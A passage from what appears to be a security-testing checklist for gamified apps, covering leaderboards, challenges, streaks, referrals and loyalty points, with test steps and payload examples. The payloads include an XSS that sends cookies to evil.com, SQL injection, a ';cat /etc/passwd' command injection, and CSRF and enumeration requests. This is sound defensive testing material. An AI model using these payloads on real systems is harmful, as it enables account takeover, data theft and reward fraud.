**Test Steps:** 1. Create multiple fake accounts. 2. Earn points on all accounts. 3. Transfer or consolidate points to one account. 4. Check if anti-fraud measures detect multiple account abuse.

**Expected Result:** Application must implement anti-Sybil measures such as account verification and anomaly detection to prevent fake account manipulation.

**Payload Example:**

```
Create 50 accounts;earn points on each;check if system detects pattern of multi-account abuse
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Custom Scripts;Burp Suite

**References:** CWE-840; PortSwigger Business logic

---

## GAME-038 — Leaderboard Cache Poisoning
**Test Category:** Caching (WSTG-ATHN-06) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Leaderboards

**Test Steps:** 1. Access the leaderboard endpoint. 2. Add cache-busting or cache-poisoning headers. 3. Check if manipulated leaderboard data can be cached for other users.

**Expected Result:** Application must not cache user-specific leaderboard views in shared caches and must validate cache integrity.

**Payload Example:**

```
Add X-Forwarded-Host: evil.com;modify leaderboard data and check if cached for other users
```

**Impact:** Web cache poisoning/deception -&gt; mass XSS/redirect or private-data disclosure.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-524; -&gt;[Web Cache Poisoning checklist](#/checklist/webcache); James Kettle Web Cache Poisoning/Deception

---

## GAME-039 — Leaderboard Privacy Violation
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Leaderboards

**Test Steps:** 1. Check leaderboard entries for excessive user data exposure. 2. Look for email addresses or real names or location data. 3. Check if users can opt out of leaderboard visibility.

**Expected Result:** Leaderboards must only display consented public information and provide opt-out mechanisms for privacy.

**Payload Example:**

```
Inspect leaderboard response for email;full_name;location;join_date;purchase_history of other users
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Burp Suite;Postman

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## GAME-040 — Leaderboard Time-Based Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Leaderboards

**Test Steps:** 1. Check if leaderboard resets on time periods. 2. Manipulate client-side time or timezone parameters. 3. Submit scores at manipulated time boundaries. 4. Check for double-counting at period boundaries.

**Expected Result:** Application must use server-side timestamps for all leaderboard calculations and ignore client-provided time values.

**Payload Example:**

```
Modify timezone parameter or submit_time to exploit period boundary;submit at UTC vs local time boundary
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-041 — Leaderboard Denial of Service via Excessive Queries
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Leaderboards

**Test Steps:** 1. Send rapid requests to leaderboard endpoints with complex filters. 2. Request very large result sets. 3. Monitor for performance degradation.

**Expected Result:** Application must implement rate limiting and result size limits on leaderboard queries to prevent resource exhaustion.

**Payload Example:**

```
GET /api/leaderboard?limit=999999;send 500+ requests per minute with complex sorting and filtering
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite Intruder;JMeter

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## GAME-042 — Challenge Completion Forgery
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Challenges / Quests

**Test Steps:** 1. Accept a challenge. 2. Intercept the completion request without actually completing the challenge. 3. Submit a forged completion request. 4. Check if rewards are granted.

**Expected Result:** Application must validate challenge completion against actual server-side tracking of challenge requirements and not trust client claims.

**Payload Example:**

```
POST /api/challenges/CHAL-001/complete with completed=true without meeting actual requirements
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-043 — IDOR on Challenge Progress Access
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Challenges / Quests

**Test Steps:** 1. View own challenge progress. 2. Change user_id to view another user's challenge progress. 3. Check if private challenge strategies or progress data is leaked.

**Expected Result:** Application must verify ownership before displaying challenge progress and respect privacy settings.

**Payload Example:**

```
GET /api/challenges/progress?user_id=1002;GET /api/users/1002/quests with User A credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## GAME-044 — Challenge Reward Duplication
**Test Category:** Business Logic (WSTG-BUSL-08) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Challenges / Quests

**Test Steps:** 1. Complete a challenge. 2. Send multiple simultaneous reward claim requests. 3. Check if rewards are credited multiple times. 4. Verify idempotency.

**Expected Result:** Application must implement idempotent reward claiming to prevent duplicate rewards from concurrent or repeated requests.

**Payload Example:**

```
Send 30 concurrent POST /api/challenges/CHAL-001/claim-reward requests
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Turbo Intruder;Burp Suite

**References:** CWE-840; PortSwigger Business logic

---

## GAME-045 — Challenge Timer Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Challenges / Quests

**Test Steps:** 1. Accept a timed challenge. 2. Intercept the completion request and modify the completion_time or duration parameter. 3. Submit with manipulated time showing faster completion.

**Expected Result:** Application must track challenge timers server-side and calculate completion time from server timestamps not client-provided values.

**Payload Example:**

```
Change completion_time=3600 to completion_time=1;modify started_at to recent timestamp in completion request
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-046 — Quest Prerequisite Bypass
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Challenges / Quests

**Test Steps:** 1. Identify quests with prerequisite requirements. 2. Attempt to start or complete advanced quests without completing prerequisites. 3. Call quest endpoints directly via API.

**Expected Result:** Application must validate all prerequisites server-side before allowing quest access or completion.

**Payload Example:**

```
POST /api/quests/ADVANCED-QUEST/start without completing prerequisite quests;modify prerequisites_met=true
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-047 — SQL Injection in Challenge Search
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Challenges / Quests

**Test Steps:** 1. Search or filter available challenges. 2. Inject SQL payloads in search parameters. 3. Observe for SQL errors or unauthorized data access.

**Expected Result:** Application must use parameterized queries for all challenge search operations.

**Payload Example:**

```
GET /api/challenges?search=' OR 1=1--;GET /api/quests?category=daily' UNION SELECT email FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## GAME-048 — Challenge Progress Rollback Abuse
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Challenges / Quests

**Test Steps:** 1. Make progress on a challenge. 2. Attempt to rollback or reset progress via API. 3. Re-earn interim rewards. 4. Check if progress milestones can be re-triggered.

**Expected Result:** Application must track claimed milestones permanently and prevent re-earning of rewards through progress manipulation.

**Payload Example:**

```
POST /api/challenges/CHAL-001/reset then re-claim milestone rewards;modify progress_checkpoint values
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-049 — XSS in Challenge Title or Description
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Challenges / Quests

**Test Steps:** 1. If users can create challenges inject XSS in title or description. 2. Share the challenge. 3. Check if XSS executes when other users view the challenge.

**Expected Result:** Application must sanitize all user-created challenge content and encode output when rendering.

**Payload Example:**

```
challenge_title=<script>alert(document.cookie)</script>;description=<svg/onload=fetch('https://evil.com/'+document.cookie)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## GAME-050 — Daily Reward Clock Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Daily Rewards

**Test Steps:** 1. Claim daily reward. 2. Manipulate client-side clock or timezone parameter. 3. Attempt to claim the reward again by advancing the date. 4. Check if server validates the claim time.

**Expected Result:** Application must track daily reward claims using server-side timestamps and not trust client-provided time or timezone values.

**Payload Example:**

```
Change timezone parameter;modify date header;send claim request with manipulated timestamp
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-051 — Daily Reward Race Condition
**Test Category:** Business Logic (WSTG-BUSL-08) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Daily Rewards

**Test Steps:** 1. Wait for daily reward availability. 2. Send multiple simultaneous claim requests at the exact reset time. 3. Check if multiple rewards are credited.

**Expected Result:** Application must implement atomic claim processing with proper locking to prevent duplicate daily reward claims.

**Payload Example:**

```
Send 50 concurrent POST /api/daily-rewards/claim at exactly 00:00:00 UTC
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder;Burp Suite

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## GAME-052 — IDOR on Daily Reward Claim
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Daily Rewards

**Test Steps:** 1. Claim own daily reward. 2. Intercept and change user_id. 3. Check if daily reward is claimed for another user. 4. Test if another user's reward status is affected.

**Expected Result:** Application must bind daily reward claims to the authenticated session and not accept client-provided user identifiers.

**Payload Example:**

```
Change POST /api/daily-rewards/claim with user_id=1001 to user_id=1002
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## GAME-053 — Daily Reward Value Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Daily Rewards

**Test Steps:** 1. Claim daily reward and intercept the response. 2. Modify the reward_value or reward_type in the response. 3. Check if the application uses the modified value. 4. Try modifying the request.

**Expected Result:** Application must determine reward values server-side based on user tier and day and not accept client-modified reward values.

**Payload Example:**

```
Change reward_value=10 to reward_value=10000;change reward_type=bronze to reward_type=diamond
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-054 — Daily Reward Bypass via API Versioning
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Daily Rewards

**Test Steps:** 1. Try claiming daily rewards through older API versions. 2. Check if deprecated endpoints lack cooldown validation. 3. Test for inconsistent enforcement.

**Expected Result:** Application must enforce daily reward limits consistently across all API versions.

**Payload Example:**

```
POST /api/v1/daily-rewards/claim after already claiming via /api/v2/daily-rewards/claim
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;DirBuster

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## GAME-055 — CSRF on Daily Reward Claim
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Daily Rewards

**Test Steps:** 1. Craft a malicious page that auto-claims the victim's daily reward. 2. Lure victim to visit while authenticated. 3. Check if the reward is claimed without victim's action.

**Expected Result:** Application must implement CSRF protection on daily reward claim endpoints.

**Payload Example:**

```
<img src='https://target.com/api/daily-rewards/claim'>;auto-submit form for daily reward claim
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## GAME-056 — Daily Reward Escalation via Day Counter Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Daily Rewards

**Test Steps:** 1. If rewards escalate by consecutive days intercept the claim request. 2. Modify the day_counter or streak parameter. 3. Check if higher-value rewards are granted prematurely.

**Expected Result:** Application must track consecutive day counters server-side and not accept client-provided streak or day values.

**Payload Example:**

```
Change day_counter=1 to day_counter=30 to claim 30th-day premium reward on first day
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-057 — Streak Counter Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Streaks

**Test Steps:** 1. Check current streak count. 2. Intercept streak update request. 3. Modify streak_count parameter to a high value. 4. Check if manipulated streak triggers advanced rewards.

**Expected Result:** Application must calculate streaks server-side from actual activity timestamps and never accept client-provided streak values.

**Payload Example:**

```
Change streak_count=3 to streak_count=365 in PUT /api/streaks/update
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-058 — Streak Freeze Exploit
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Streaks

**Test Steps:** 1. If streak freeze feature exists use it. 2. Intercept the freeze request. 3. Modify freeze_duration or freeze_count parameters. 4. Check if unlimited freezes can be applied.

**Expected Result:** Application must enforce streak freeze limits server-side and validate freeze usage against allowed quotas.

**Payload Example:**

```
Change freeze_count=1 to freeze_count=999;modify freeze_duration=1day to freeze_duration=365days
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-059 — Streak Backdating via Timestamp Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Streaks

**Test Steps:** 1. Miss a day in the streak. 2. Intercept a streak activity request. 3. Modify the activity_timestamp to cover the missed day. 4. Check if the streak continues unbroken.

**Expected Result:** Application must use server-side timestamps for streak calculations and reject client-provided activity timestamps.

**Payload Example:**

```
Change activity_timestamp=2025-01-15T10:00:00Z to cover missed day 2025-01-14
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-060 — Race Condition on Streak Reset
**Test Category:** Business Logic (WSTG-BUSL-08) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Streaks

**Test Steps:** 1. At the streak reset boundary send simultaneous activity and check requests. 2. Verify if race condition preserves streak that should have been reset. 3. Check for inconsistent state.

**Expected Result:** Application must handle streak evaluation atomically at period boundaries to prevent race condition exploitation.

**Payload Example:**

```
Send concurrent POST /api/streaks/activity and GET /api/streaks/status at midnight boundary
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder;Burp Suite

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## GAME-061 — IDOR on Streak Data Access
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Streaks

**Test Steps:** 1. View own streak information. 2. Change user_id to access other users' streak data. 3. Check if streak patterns and activity history are exposed.

**Expected Result:** Application must enforce access control on streak data and only allow users to view their own streak information.

**Payload Example:**

```
GET /api/streaks?user_id=1002;GET /api/users/1002/streaks with User A credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## GAME-062 — Streak Reward Multi-Claim
**Test Category:** Business Logic (WSTG-BUSL-08) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Streaks

**Test Steps:** 1. Reach a streak milestone. 2. Send multiple simultaneous reward claim requests for the milestone. 3. Check if rewards are granted multiple times.

**Expected Result:** Application must implement idempotent milestone reward claiming to prevent duplicate rewards.

**Payload Example:**

```
Send 20 concurrent POST /api/streaks/claim-milestone/30-day requests
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Turbo Intruder;Burp Suite

**References:** CWE-840; PortSwigger Business logic

---

## GAME-063 — Referral Code Self-Referral Abuse
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Referral Program

**Test Steps:** 1. Generate own referral code. 2. Create a new account using own referral code. 3. Check if referral bonus is credited to both accounts. 4. Test with same device and IP.

**Expected Result:** Application must prevent self-referrals by checking for shared identifiers like IP address and device fingerprint and email patterns.

**Payload Example:**

```
Create new account with own referral_code from same device/IP/browser
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Multiple Browsers

**References:** CWE-840; PortSwigger Business logic

---

## GAME-064 — Referral Code Brute Force
**Test Category:** Information Disclosure (WSTG-INFO-04) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Referral Program

**Test Steps:** 1. Note the referral code format. 2. Enumerate or brute-force referral codes. 3. Check if valid codes can be discovered. 4. Test rate limiting on referral code validation.

**Expected Result:** Application must use non-predictable referral codes and implement rate limiting on code validation endpoints.

**Payload Example:**

```
Enumerate /api/referral/validate?code=REF0001 through REF9999;brute-force 6-char alphanumeric codes
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite Intruder;ffuf

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## GAME-065 — Referral Reward Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Referral Program

**Test Steps:** 1. Complete a referral. 2. Intercept the reward credit request. 3. Modify the reward_amount or bonus_type parameter. 4. Check if inflated rewards are credited.

**Expected Result:** Application must calculate referral rewards server-side based on program rules and not accept client-provided reward values.

**Payload Example:**

```
Change reward_amount=50 to reward_amount=5000;change bonus_type=basic to bonus_type=premium
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-066 — Referral Chain Exploitation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Referral Program

**Test Steps:** 1. Create a chain of referrals where each account refers the next. 2. Check if referral bonuses compound or if multi-level rewards exist. 3. Test for infinite referral chain abuse.

**Expected Result:** Application must implement depth limits on referral chains and detect circular referral patterns.

**Payload Example:**

```
Create accounts A->B->C->D with each referring the next;check for cascading bonuses
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Custom Scripts;Burp Suite

**References:** CWE-840; PortSwigger Business logic

---

## GAME-067 — IDOR on Referral Statistics
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Referral Program

**Test Steps:** 1. View own referral statistics. 2. Change user_id to view other users' referral data. 3. Check if referral earnings and referee information are exposed.

**Expected Result:** Application must restrict referral statistics access to the referrer's own account only.

**Payload Example:**

```
GET /api/referral/stats?user_id=1002;GET /api/users/1002/referrals with User A credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## GAME-068 — Referral Code Injection
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Referral Program

**Test Steps:** 1. Use the referral code field. 2. Inject SQL or XSS or command payloads in the referral code. 3. Submit and observe the response.

**Expected Result:** Application must validate referral codes against expected patterns and use parameterized queries.

**Payload Example:**

```
referral_code=' OR 1=1--;referral_code=<script>alert(1)</script>;referral_code=;cat /etc/passwd
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## GAME-069 — Referral Fraud via Automated Account Creation
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Referral Program

**Test Steps:** 1. Script automated creation of accounts using the same referral code. 2. Complete minimum qualifying actions on each account. 3. Check if referral rewards accumulate without fraud detection.

**Expected Result:** Application must implement fraud detection for referral programs including velocity checks and behavioral analysis.

**Payload Example:**

```
Automate creation of 100 accounts with same referral_code;complete qualifying action on each
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Custom Scripts;Selenium

**References:** CWE-840; PortSwigger Business logic

---

## GAME-070 — CSRF on Referral Code Application
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Referral Program

**Test Steps:** 1. Craft a malicious page that applies the attacker's referral code to the victim's new account. 2. Lure the victim to visit during registration. 3. Check if the code is applied.

**Expected Result:** Application must require explicit user action to apply referral codes and implement CSRF protection.

**Payload Example:**

```
<img src='https://target.com/api/referral/apply?code=ATTACKER_CODE'>;auto-submit form with attacker's referral code
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## GAME-071 — Referral Reward Without Qualifying Action
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Referral Program

**Test Steps:** 1. Apply a referral code during registration. 2. Attempt to claim the referral reward without completing the qualifying action like first purchase. 3. Check if reward is granted prematurely.

**Expected Result:** Application must validate that all qualifying conditions are met before granting referral rewards.

**Payload Example:**

```
POST /api/referral/claim-reward without completing qualifying purchase;modify qualifying_action_completed=true
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-072 — Loyalty Points Balance Tampering
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Loyalty Program

**Test Steps:** 1. Check loyalty points balance. 2. Intercept the balance response and modify it. 3. Use the modified balance for a redemption. 4. Check if the application rechecks balance server-side.

**Expected Result:** Application must validate loyalty points balance at the time of each transaction server-side and not trust cached or client values.

**Payload Example:**

```
Modify balance response from 100 to 100000;attempt redemption with server-side balance of only 100 points
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-073 — Loyalty Tier Upgrade Bypass
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Loyalty Program

**Test Steps:** 1. Check current loyalty tier criteria. 2. Intercept tier evaluation request. 3. Modify spending or activity metrics to qualify for higher tier. 4. Check if upgrade is granted.

**Expected Result:** Application must evaluate loyalty tier eligibility from actual transaction records server-side and not trust client-provided metrics.

**Payload Example:**

```
Change total_spend=100 to total_spend=10000 in tier evaluation;modify eligible_transactions count
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-074 — Loyalty Card Number Enumeration
**Test Category:** Information Disclosure (WSTG-INFO-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Loyalty Program

**Test Steps:** 1. Note the loyalty card number format. 2. Enumerate sequential loyalty card numbers. 3. Check if card details or point balances are exposed for enumerated numbers.

**Expected Result:** Application must use non-predictable loyalty identifiers and require authentication before revealing any loyalty account details.

**Payload Example:**

```
Enumerate GET /api/loyalty/card/CARD-000001 through CARD-999999
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite Intruder;ffuf

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## GAME-075 — Loyalty Points Transfer Without Authorization
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Loyalty Program

**Test Steps:** 1. Transfer loyalty points to another user. 2. Intercept and change from_account to a different user. 3. Check if points are transferred from an unauthorized account.

**Expected Result:** Application must verify that the source account belongs to the authenticated user before processing loyalty point transfers.

**Payload Example:**

```
